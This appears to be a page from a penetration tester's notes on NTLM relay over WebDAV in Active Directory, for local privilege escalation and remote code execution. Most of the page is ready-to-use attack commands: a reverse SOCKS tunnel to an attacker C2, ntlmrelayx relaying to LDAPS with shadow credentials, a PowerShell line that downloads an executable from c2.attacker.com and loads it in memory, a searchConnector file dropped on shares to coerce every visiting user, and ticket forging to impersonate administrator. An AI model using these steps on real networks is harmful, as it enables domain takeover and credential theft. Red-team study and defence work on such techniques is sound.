---
title: NTLM Relay from WebDAV
---

Use a computer where the WebClient service is running as [[notes/ad/ntlm-relay-source]] by coercing NTLM over WebDAV / [[notes/ad/ntlm-relay-from-http|HTTP]].
The WebClient is installed by default only on workstations and the service is stopped.

Coercion over WebDAV works reliably on Windows 10, but seldomly works on Windows 11 for unknown reasons.

# Local Privilege Escalation

Coerce authentication trough [[notes/ad/ntlm-relay-from-print-spooler|Print Spooler]] or [[notes/ad/ntlm-relay-from-efs|PetitPotam]] and [[notes/ad/ntlm-relay-to-ldap|relay to LDAP]] for local [[notes/windows/escalation]].

Windows: Check if the service is running.

~~~ powershell
Get-Service WebClient
~~~

Windows: Trigger the start of the service.
This command fails intentionally.

~~~ bat
start \\1.1.1.1@80\
~~~

Windows: Verify that the service is running now.

~~~ powershell
Get-Service WebClient
~~~

C2: Start [[notes/tools/chisel]] server.

~~~ bash
./chisel server --auth chisel:'passw0rd' --reverse --socks5 --port 80
~~~

C2: Start the NTLM relay server [[notes/ad/ntlm-relay-to-ldap|to LDAP]].
If you control a computer account you can use [[notes/ad/rbcd]] instead of [[notes/ad/shadow-credentials]].

~~~ bash
proxychains impacket-ntlmrelayx --no-raw-server --no-wcf-server --no-smb-server -smb2support --no-dump --no-acl --no-da --no-validate-privs -debug --http-port 8080 --shadow-credentials --shadow-target 'ws01$' --target ldaps://dc01.corp.local
~~~

Windows: Start [[notes/tools/chisel]] client to establish a reverse SOCKS proxy with the attacker and forward 8080/tcp to the C2 server.
See [[notes/pivoting/index]] for alternate tools.

~~~ bat
.\chisel.exe client --auth chisel:passw0rd https://c2.attacker.com R:127.0.0.1:1080:socks 127.0.0.1:8080:127.0.0.1:8080
~~~

Windows: Coerce NTLM authentication over WebDAV to the attacker.

~~~ ps1
$x=(New-Object System.Net.WebClient).DownloadData('https://c2.attacker.com/sharpefstrigger.exe')
$y=[System.Reflection.Assembly]::Load([byte[]]$x)
[SharpEFSTrigger.Program]::Main(@('localhost','localhost@8080/something','EfsRpcEncryptFileSrv'))
~~~

C2: Wait until the incoming NTLM connection is relayed to LDAP and the resulting certificate is shown.
Then use the command that is printed afterwards to authenticate with the certificate and get a TGT for the computer account.

C2: Use the TGT to perform S4U2Self and gain a ST as local admin on the computer.

~~~ bash
export KRB5CCNAME="$PWD/ws01.ccache"
proxychains impacket-getst -impersonate administrator -self -altservice cifs/ws01.corp.local -k -no-pass 'corp.local/ws01$'
~~~

Other tools:

- [DavRelayUp](https://github.com/Dec0ne/DavRelayUp), `KrbRelayUp` successor, only has RBCD implemented

Untested tools:

- [SharpStartWebclient](https://github.com/eversinc33/SharpStartWebclient)
- [EtwStartWebClient.cs](https://gist.github.com/klezVirus/af004842a73779e1d03d47e041115797)

References:

- [Operator’s Guide to the Meterpreter BOFLoader](http://web.archive.org/web/20230707075341/https://www.trustedsec.com/blog/operators-guide-to-the-meterpreter-bofloader/), exploitation with BOFs only
- [Coercions and relays – The first cred is the deepest with Gabriel Prud'homme](https://www.youtube.com/watch?v=b0lLxLJKaRs&t=60m)
- [NTLMRelay2Self over HTTP](https://github.com/med0x2e/ntlmrelay2self)

# Remote Code Execution

Acquire a [[notes/ad/intranet-zone|intranet-zoned]] hostname.

Find computers where the WebClient service is running.

=== "[[notes/tools/netexec]]"
    ~~~ bash
    netexec smb 192.168.178.0/24 -d corp.local -u jdoe -p 'passw0rd' -M webdav | grep WEBDAV
    ~~~

If no interesting targets are found write the following file to a public SMB share.
Every user that opens the directory triggers the start of the WebClient on his/her computer.

`./test.rtf.searchconnector-ms`:

~~~ xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <iconReference>imageres.dll,-1002</iconReference>
  <description>Microsoft RTF Document</description>
  <isSearchOnlyItem>false</isSearchOnlyItem>
  <includeInStartMenuScope>true</includeInStartMenuScope>
  <templateInfo>
    <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
  </templateInfo>
  <simpleLocation>
    <url>http://hackerpc/test</url>
  </simpleLocation>
</searchConnectorDescription>
~~~

Or automated with [[notes/tools/netexec]] ([source](http://web.archive.org/web/20230426070201/https://mayfly277.github.io/posts/GOADv2-pwning-part13/)).

~~~ bash
netexec smb fs01.corp.local -u jdoe -p 'passw0rd' -M drop-sc -o SHARE=transfer -o FILENAME=test.rtf -o URL=http://hackerpc/test
netexec smb fs01.corp.local -u jdoe -p 'passw0rd' -M drop-sc -o SHARE=transfer -o FILENAME=test.rtf -o CLEANUP=true
~~~

Coerce a WebDAV connection, e.g. trough the [[notes/ad/ntlm-relay-from-print-spooler]], and relay [[notes/ad/ntlm-relay-to-ldap|to LDAP]] like in the LPE scenario.

Untested tools:

- [GetWebDAVStatus](https://github.com/g0ldengunsec/getwebdavstatus)
- [WebclientServiceScanner](https://github.com/hackndo/webclientservicescanner)

References:

- [twitter.com/ShitSecure/status/1757033136829972618](https://twitter.com/ShitSecure/status/1757033136829972618), some EDRs seem to interfere with the attack by blocking authentication of computer accounts
- [Shadow Credentials: Workstation Takeover Edition](http://web.archive.org/web/20240103150213/https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
- [Coercing the WebClient service to start](https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb#coercing-the-webclient-service-to-start)
- [Lateral movement with WebClient](http://web.archive.org/web/20221122214543/https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
